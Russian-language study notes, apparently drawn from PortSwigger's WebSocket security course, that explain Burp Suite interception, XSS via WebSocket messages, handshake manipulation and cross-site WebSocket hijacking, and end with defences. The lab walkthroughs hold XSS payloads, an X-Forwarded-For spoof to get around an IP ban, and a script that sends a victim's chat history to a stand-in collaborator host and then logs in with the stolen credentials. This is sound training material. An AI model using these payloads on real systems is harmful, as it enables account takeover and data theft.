## WebSockets

WebSockets широко используются в современных веб-приложениях. Они инициируются через HTTP и обеспечивают долгосрочные соединения с асинхронной коммуникацией в обоих направлениях.

WebSockets используются для самых разных целей, включая выполнение действий пользователя и передачу конфиденциальной информации. Практически любая уязвимость веб-безопасности, возникающая при обычном HTTP, также может возникнуть в связи с WebSockets.

![[Pasted image 20251225122200.png]]

---

## Управление трафиком WebSocket

Вы можете использовать Burp Suite для:

- Перехватываете и изменяйте сообщения WebSocket.
- Воспроизводите и генерируйте новые сообщения WebSocket.
- Манипулируйте WebSocket-соединениями.

---

### Перехват и изменение сообщений WebSocket

Вы можете использовать Burp Proxy для перехвата и изменения сообщений WebSocket, следующим образом:

- Откройте браузер Burp.
- Переходите к функции приложения, использующей WebSockets. Вы можете определить, что WebSockets используются, используя приложение и ища записи, появляющиеся во вкладке истории WebSockets в Burp Proxy.
- Во вкладке Intercept в Burp Proxy убедитесь, что перехват включён.
- Когда сообщение WebSocket отправляется из браузера или сервера, оно отображается на вкладке Intercept, чтобы вы могли его просмотреть или изменить. Нажмите кнопку Forward, чтобы переслать сообщение.

> **Примечание**
>
> Вы можете настроить, перехватывают ли клиент-сервер или сервер-клиент сообщения в Burp Proxy. Сделайте это в диалоге «Настройки», в настройках правил перехвата WebSocket.

---

### Повторное воспроизведение и генерация новых сообщений WebSocket

Помимо перехвата и изменения сообщений WebSocket на лету, вы можете воспроизводить отдельные сообщения и генерировать новые. Это можно сделать с помощью Burp Repeater:

- В Burp Proxy выберите сообщение в истории WebSockets или во вкладке Intercept и выберите «Отправить в Repeater» в контекстном меню.
- В Burp Repeater теперь можно редактировать выбранное сообщение и отправлять его снова и снова.
- Вы можете ввести новое сообщение и отправить его в любую сторону — клиенту или серверу.
- В панели «История» в Burp Repeater вы можете просмотреть историю сообщений, переданных через WebSocket. Это включает сообщения, которые вы сгенерировали в Burp Repeater, а также те, что были сгенерированы браузером или сервером по тому же соединению.
- Если вы хотите отредактировать и повторно отправить любое сообщение в панели истории, вы можете сделать это, выбрав сообщение и выбрав «Редактировать и переотправить» в контекстном меню.

---

### Манипуляция соединениями WebSocket

Помимо обработки сообщений WebSocket, иногда необходимо и рукопожатие WebSocket, которое устанавливает соединение.

Существует множество ситуаций, в которых может потребоваться манипуляция рукопожатием WebSocket:

- Это позволит вам достичь большей площадки для атаки.
- Некоторые атаки могут привести к разрыву соединения, поэтому нужно наладить новое.
- Токены или другие данные в оригинальном запросе на рукопожатие могут быть устаревшими и нуждаться в обновлении.

Вы можете управлять рукопожатием WebSocket с помощью Burp Repeater:

- Отправьте сообщение WebSocket на Burp Repeater, как уже было описано.
- В Burp Repeater нажмите на значок карандаша рядом с URL WebSocket. Это открывает функцию, позволяющую подключиться к уже подключённому WebSocket, клонировать его или снова подключиться к отключённому WebSocket.
- Если вы решите клонировать подключённый WebSocket или снова подключиться к отключённому WebSocket, функция в карандаше покажет полные детали запроса рукопожатия WebSocket, которые можно отредактировать по мере необходимости перед выполнением рукопожатия.
- Когда вы нажимаете «Соединить», Burp попытается выполнить заданное рукопожатие и отобразит результат. Если новое соединение WebSocket было успешно установлено, вы можете использовать его для отправки новых сообщений в Burp Repeater.

---

## Уязвимости безопасности WebSockets

В принципе, практически любая уязвимость веб-безопасности может возникнуть в отношении WebSockets:

- Пользовательский ввод, передаваемый серверу, может обрабатываться небезопасным способом, что приводит к уязвимостям, таким как инъекция SQL или инъекция внешних сущностей XML.
- Некоторые слепые уязвимости, достигнутые через WebSockets, могут быть обнаружены только с помощью внеполосных (OAST) методов.
- Если данные, контролируемые злоумышленниками, передаются через WebSockets другим пользователям приложений, это может привести к уязвимостям на стороне других клиентов, например XSS.

---

### Манипулирование сообщениями WebSocket для эксплуатации уязвимостей

Большинство уязвимостей на основе ввода, влияющих на WebSockets, можно обнаружить и использовать путём вмешательства в содержимое сообщений WebSocket.

Например, предположим, чат-приложение использует WebSockets для отправки чат-сообщений между браузером и сервером. Когда пользователь вводит сообщение в чате, на сервер отправляется следующее сообщение WebSocket:

`{"message":"Hello Carlos"}`

Содержимое сообщения передаётся (снова через WebSockets) другому пользователю чата и отображается в браузере пользователя следующим образом:

`<td>Hello Carlos</td>`

В такой ситуации, при условии, что не применяются другие вводные процессы или защиты, злоумышленник может выполнить атаку XSS, отправив следующее сообщение WebSocket:

`{"message":"<img src=1 onerror='alert(1)'>"}`

---

### Манипулирование handshake WebSocket для эксплуатации уязвимостей

Некоторые уязвимости WebSockets можно обнаружить и использовать только путем манипуляции рукопожатием WebSocket. Эти уязвимости, как правило, связаны с конструктивными недостатками, такими как:

- Неправильное доверие к HTTP-заголовкам для принятия решений по безопасности, таким как заголовок `X-Forwarded-For`. 
- Недостатки в механизмах обработки сессий, поскольку контекст сессии, в котором обрабатываются сообщения WebSocket, обычно определяется контекстом сессии сообщения рукопожатия.
- Поверхность атаки вводилась через пользовательские HTTP-заголовки, используемые приложением.

---

### Использование межсайтовых WebSockets для эксплуатации уязвимостей

Некоторые уязвимости безопасности WebSockets возникают, когда злоумышленник совершает междоменное WebSocket соединение с веб-сайта, контролируемого злоумышленником. Это известно как кросс-сайтовая атака на WebSocket hijacking и включает использование уязвимости cross-site request forgery (CSRF) при рукопожатии WebSocket. Атака часто оказывает серьёзные последствия, позволяя злоумышленнику совершать привилегированные действия от имени жертвы или захватывать конфиденциальные данные, к которым у него есть доступ.

---

#### Что такое кросс-сайтовый захват WebSocket?

Кросс-сайт WebSocket hijacking (также известный как cross-origin WebSocket hijacking) предполагает уязвимость cross-site request forgery (CSRF) при рукопожатии WebSocket. Он возникает, когда запрос на рукопожатие WebSocket полностью зависит от HTTP-файлов cookie для обработки сессий и не содержит CSRF-токенов или других непредсказуемых значений.

Злоумышленник может создать вредоносную веб-страницу на своём домене, которая устанавливает межсайтовое WebSocket соединение с уязвимым приложением. Приложение обрабатывает соединение в контексте сессии пользователя-жертвы с приложением.

Страница злоумышленника затем может отправлять произвольные сообщения на сервер через соединение и читать содержимое сообщений, полученных обратно с сервера. Это означает, что, в отличие от обычного CSRF, злоумышленник получает двустороннее взаимодействие с скомпрометированным приложением.

---

#### Каково влияние кросс-сайтового захвата WebSocket?

Успешная кросс-сайтовая атака-захват WebSocket часто позволяет злоумышленнику:

- **Совершайте несанкционированные действия под видом жертвы.** Как и в обычном CSRF, злоумышленник может отправлять произвольные сообщения серверному приложению. Если приложение использует клиентские WebSocket сообщения для выполнения чувствительных действий, злоумышленник может генерировать подходящие сообщения между доменами и запускать эти действия.
- **Получить конфиденциальные данные, к которым пользователь может получить доступ.** В отличие от обычного CSRF, кросс-сайт WebSocket hijacking даёт злоумышленнику двустороннее взаимодействие с уязвимым приложением через захваченный WebSocket. Если приложение использует серверные сообщения WebSocket для возврата конфиденциальных данных пользователю, злоумышленник может перехватить эти сообщения и захватить данные жертвы.

---

#### Выполнение кросс-сайтовой атаки с захватом WebSocket

Поскольку кросс-сайт WebSocket hijacking по сути является уязвимостью CSRF при рукопожатии WebSocket, первым шагом к проведению атаки является анализ рукопожатий WebSocket, выполненных приложением, и определение, защищены ли они от CSRF.

Что касается обычных условий для CSRF-атак, обычно нужно найти сообщение с рукопожатием, которое полностью зависит от HTTP-файлов для обработки сессий и не содержит токенов или других непредсказуемых значений в параметрах запроса.

---

Например, следующий запрос на рукопожатие WebSocket, вероятно, уязвим к CSRF, поскольку единственный токен сессии передаётся в cookie:

```http
GET /chat HTTP/1.1 
Host: normal-website.com 
Sec-WebSocket-Version: 13 
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w== 
Connection: keep-alive, Upgrade 
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2 
Upgrade: websocket
```

> **Примечание**
>
>Заголовок `Sec-WebSocket-Key` содержит случайное значение для предотвращения ошибок при кэшировании прокси и не используется для аутентификации или обработки сессий. 

---

Если запрос на рукопожатие WebSocket уязвим к CSRF, то веб-страница злоумышленника может выполнить межсайтовый запрос для открытия WebSocket на уязвимом сайте. То, что произойдёт дальше в атаке, полностью зависит от логики приложения и того, как оно использует WebSockets. Атака может включать:

- Отправку сообщений WebSocket для выполнения несанкционированных действий от имени пользователя-жертвы.
- Отправку сообщений WebSocket для получения конфиденциальных данных.
- Иногда просто ожидание входящих сообщений с конфиденциальными данными.

---

# Лабораторные 

---

## Lab: Manipulating WebSocket messages to exploit vulnerabilities

[Уязвимости WebSockets - PortSwigger](https://portswigger.net/web-security/learning-paths/websockets-security-vulnerabilities/manipulating-websocket-messages-to-exploit-vulnerabilities/websockets/lab-manipulating-messages-to-exploit-vulnerabilities)

```json
{"message":"<image src=x onerror=alert()>"}
```

---

## Lab: Manipulating the WebSocket handshake to exploit vulnerabilities

https://portswigger.net/web-security/learning-paths/websockets-security-vulnerabilities/manipulating-the-websocket-handshake-to-exploit-vulnerabilities/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities


1. Click "Live chat" and send a chat message.
2. In Burp Proxy, go to the WebSockets history tab, and observe that the chat message has been sent via a WebSocket message.
3. Right-click on the message and select "Send to Repeater".
4. Edit and resend the message containing a basic XSS payload, such as:
    `<img src=1 onerror='alert(1)'>`
5. Observe that the attack has been blocked, and that your WebSocket connection has been terminated.
6. Click "Reconnect", and observe that the connection attempt fails because your IP address has been banned.
7. Add the following header to the handshake request to spoof your IP address:
    `X-Forwarded-For: 1.1.1.1`
8. Click "Connect" to successfully reconnect the WebSocket.
9. Send a WebSocket message containing an obfuscated XSS payload, such as:
  
```html
`<img src=1 oNeRrOr=alert`1`>`
```

---

## Lab: Cross-site WebSocket hijacking

https://portswigger.net/web-security/learning-paths/websockets-security-vulnerabilities/using-cross-site-websockets-to-exploit-vulnerabilities/websockets/cross-site-websocket-hijacking/lab

1. Click "Live chat" and send a chat message.
2. Reload the page.
3. In Burp Proxy, in the WebSockets history tab, observe that the "READY" command retrieves past chat messages from the server.
4. In Burp Proxy, in the HTTP history tab, find the WebSocket handshake request. Observe that the request has no CSRF tokens.
5. Right-click on the handshake request and select "Copy URL".
6. In the browser, go to the exploit server and paste the following template into the "Body" section:
    
	```html
	<script> var ws = new WebSocket('wss://your-websocket-url'); 
		ws.onopen = function() { ws.send("READY"); }; 
		ws.onmessage = function(event) { 
			fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data}); 
		}; 
	</script>
	```
1. Replace `your-websocket-url` with the URL from the WebSocket handshake (`YOUR-LAB-ID.web-security-academy.net/chat`). Make sure you change the protocol from `https://` to `wss://`. Replace `your-collaborator-url` with a payload generated by Burp Collaborator.
2. Click "View exploit".
3. Poll for interactions in the Collaborator tab. Verify that the attack has successfully retrieved your chat history and exfiltrated it via Burp Collaborator. For every message in the chat, Burp Collaborator has received an HTTP request. The request body contains the full contents of the chat message in JSON format. Note that these messages may not be received in the correct order.
4. Go back to the exploit server and deliver the exploit to the victim.
5. Poll for interactions in the Collaborator tab again. Observe that you've received more HTTP interactions containing the victim's chat history. Examine the messages and notice that one of them contains the victim's username and password.
6. Use the exfiltrated credentials to log in to the victim user's account.

---

## Как защитить WebSocket соединение

Чтобы минимизировать риск возникновения уязвимостей в области безопасности WebSockets, используйте следующие рекомендации:

- Используйте протокол `wss://` (WebSockets over TLS).
- Жёстко задайте URL конечной точки WebSockets и уж точно не включайте в этот URL управляемые пользователем данные.
- Защитите сообщение WebSocket handshake от CSRF, чтобы избежать уязвимостей, которые могут захватить WebSockets на разных сайтах.
- Считайте данные, полученные через WebSocket, ненадёжными в обоих направлениях. Безопасно обрабатывайте данные как на сервере, так и на клиентской стороне, чтобы предотвратить уязвимости на основе ввода, такие как инъекции SQL и кросс-сайтовое скриптирование.